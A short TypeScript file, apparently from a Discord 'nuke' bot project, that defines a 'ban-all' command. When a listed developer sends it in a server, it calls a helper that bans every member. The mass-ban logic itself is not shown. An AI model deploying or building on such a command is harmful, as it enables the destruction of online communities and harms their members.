import { Command } from '../../KINGMAN_NUKE/types/KING-NUKE';
export default {
    name: "ban-all",
    description: "",
    run: async(client, kmsg, args, kingman)=> {
        if(!client.config.devs.includes(kmsg.author.id)) return;
        if(!kmsg.guild) return;
        await kingman.banEveryone(kmsg.guild).catch(e=> {
            console.log(e)
        })
    } 
} as Command